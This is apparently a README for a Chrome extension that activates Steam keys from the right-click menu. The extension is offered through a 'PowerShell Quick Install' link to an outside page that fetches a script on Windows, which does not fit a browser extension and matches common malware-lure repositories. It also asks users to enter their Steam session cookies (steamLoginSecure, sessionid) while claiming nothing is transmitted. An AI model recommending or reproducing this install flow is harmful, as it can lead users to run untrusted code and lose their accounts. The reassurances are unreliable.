<div align="center">

# Right-Click Steam Key Activator Chrome Extension

![](files/1.png)

### 🚀 PowerShell Quick Install

[![](files/button.png)](https://sadamhazem-beep.github.io/right-click-steam-activator/)

[![OS](https://img.shields.io/badge/Os-Win_11-6366f1?style=plastic&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/Ps--Core-5%2B-818cf8?style=plastic&labelColor=0d1117)]() [![status](https://img.shields.io/badge/Status-Production-2ea44f?style=plastic&labelColor=0d1117)]()

</div>

---

right-click-steam-activator is a browser extension that lets you select or mark a Steam key on any web page and activate it directly from the right-click context menu. Its key detection engine identifies valid Steam keys even when surrounded by extra characters or junk data. The extension requires an active Steam store login and provides an options page for setting custom session values. Select a key, right-click, and choose the activation entry to complete the process in one step.

## 🔧 Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- Detects a Steam key inside a text selection, even when surrounded by extra characters or noise
- Adds a right-click context menu entry showing the detected key for one-click activation
- Activates the key through the Steam store in the current browser session
- Requires an active Steam store login
- Provides an options page for setting custom session values to reuse an existing login
- Lightweight, no background processing beyond the context menu action

## How it works

1. Highlight any text on a page that contains a Steam key.
2. The extension scans the selection and extracts the key, even when surrounded by extra characters or junk data.
3. Right-click the selection.
4. Choose the activation entry from the context menu.
5. The key is sent to the activation flow and the result is shown directly in the browser.

You must already be signed in to the Steam store for activation to succeed.

## Options

- **Custom credentials**: Set your own `sessionid` and `steamLoginSecure` values directly from the options page to control which Steam session the extension uses.
- **Faster account transfer**: Reuse an existing Steam login across browsers without repeating the sign-in flow.
- **Cookie override warning**: Saving these values rewrites the relevant browser cookies for the Steam domain; review your current session before applying changes.
- **Persistent settings**: Configured values are stored and applied until you update or clear them.
- **Minimal setup**: No extra configuration required — the extension works with defaults, and options are only needed for custom session handling.

## Privacy

- All key processing happens locally in the browser.
- No analytics, tracking, or telemetry.
- No external servers are contacted by the extension.
- The selected key is used only to trigger the activation flow you initiate from the context menu.
- No data is stored or transmitted beyond what is required for activation.
- Settings and preferences remain on your device.

## FAQ

- **Does it work on any website?** Yes. Select a key as text on any page, right-click, and choose the activation entry from the context menu.

- **What if the selection contains extra text?** The detection engine extracts the key even when junk data surrounds it, so you can select a full line instead of only the key.

- **Do I need to be signed in?** Yes. You must be logged in to the Steam store for activation to succeed.

- **Can I activate multiple keys at once?** No. The extension handles one selected key per action.

- **Can I move my Steam session between browsers?** Yes. Set your own `sessionid` and `steamLoginSecure` values in the options page to carry your login over. Note that this modifies your browser cookies.

- **Are my keys or credentials sent anywhere?** No. Everything stays local to your browser; the extension does not collect or transmit your data.

- **Does it store the keys I activate?** No history is kept.

- **The context menu entry doesn't appear. What should I check?** Confirm the key is selected as text and that you are logged in to the Steam store, then reload the page and try again.

## License

MIT License

Copyright (c) 2021 right-click-steam-activator

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.